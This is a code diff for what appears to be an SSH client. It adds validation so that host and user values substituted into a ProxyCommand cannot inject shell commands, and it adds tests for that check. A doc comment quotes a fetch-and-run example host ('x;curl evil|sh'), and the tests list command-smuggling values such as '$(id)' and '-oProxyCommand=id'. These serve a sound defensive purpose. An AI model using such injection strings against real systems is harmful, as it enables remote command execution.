@@ -43,6 +43,12 @@ impl ProxyCommand {
 /// Fills in the `%` tokens OpenSSH knows for a ProxyCommand: `%h` host, `%p`
 /// port, `%r` user, `%n` the host as given (the same thing here, with no
 /// aliases), and `%%` a percent sign.
+///
+/// The line goes to a shell, so a host or user standing in for a token has
+/// to be a plain word: a host named `x;curl evil|sh` would otherwise run
+/// that too, as in OpenSSH's CVE-2023-51385, and one starting with `-`
+/// would be read by the program as an option. Either can come from an
+/// import rather than from what the user typed.
 pub fn expand(command: &str, host: &str, port: u16, user: &str) -> Result<String> {
     let mut out = String::with_capacity(command.len());
     let mut chars = command.chars();
@@ -52,15 +58,31 @@ pub fn expand(command: &str, host: &str, port: u16, user: &str) -> Result<String
             continue;
         }
         match chars.next() {
-            Some('h') | Some('n') => out.push_str(host),
+            Some('h') | Some('n') => out.push_str(plain_word("host", host)?),
             Some('p') => out.push_str(&port.to_string()),
-            Some('r') => out.push_str(user),
+            Some('r') => out.push_str(plain_word("user name", user)?),
             Some('%') => out.push('%'),
             Some(other) => bail!("The proxy command has %{other}, which is not one of %h, %p, %r, %n or %%"),
             None => bail!("The proxy command ends in a lone %"),
         }
     }
     Ok(out)
+}
+
+/// Characters that mean something to `sh` or to `cmd`.
+const SHELL_SPECIAL: &[char] = &[
+    '\'', '"', '`', '$', '\\', ';', '&', '|', '<', '>', '(', ')', '{', '}', '[', ']', '*', '?', '!', '~', '#', '^', '%',
+];
+
+/// `value`, if it is one word no shell will read anything into.
+fn plain_word<'a>(what: &str, value: &'a str) -> Result<&'a str> {
+    if value.starts_with('-') {
+        bail!("The {what} {value:?} starts with -, which the proxy command would read as an option");
+    }
+    if let Some(c) = value.chars().find(|c| c.is_whitespace() || c.is_control() || SHELL_SPECIAL.contains(c)) {
+        bail!("The {what} {value:?} has {c:?} in it, which is not safe to put into the proxy command");
+    }
+    Ok(value)
 }
 
 /// The program and arguments that run `command` the way OpenSSH would: through
@@ -194,6 +216,25 @@ mod tests {
     fn an_unknown_token_is_refused() {
         assert!(expand("connect %x", "h", 22, "u").unwrap_err().to_string().contains("%x"));
         assert!(expand("connect %", "h", 22, "u").is_err());
+    }
+
+    /// A host or user that is anything but one plain word never reaches the
+    /// shell, whichever token brings it in.
+    #[test]
+    fn a_host_or_user_the_shell_would_read_into_is_refused() {
+        for host in ["x;touch /tmp/pwn", "$(id)", "`id`", "a b", "a|b", "a&b", "-oProxyCommand=id", "a\nb", "%PATH%"] {
+            assert!(expand("nc %h %p", host, 22, "u").is_err(), "host {host:?} got through");
+            assert!(expand("nc %n %p", host, 22, "u").is_err(), "host {host:?} got through %n");
+        }
+        for user in ["a;id", "a'b", "-x", "a b"] {
+            assert!(expand("ssh -W %h:%p %r@bastion", "h", 22, user).is_err(), "user {user:?} got through");
+        }
+        // Ordinary names, addresses and user names are words.
+        for host in ["db.internal", "10.0.0.5", "::1", "host-1.example.com", "under_score"] {
+            assert!(expand("nc %h %p", host, 22, "u").is_ok(), "{host:?} was refused");
+        }
+        assert!(expand("nc %h %p", "h", 22, "x;y").is_ok(), "a user not used in the command is not checked");
+        assert!(expand("ssh %r@bastion", "h", 22, "first.last@corp").is_ok());
     }
 
     #[test]
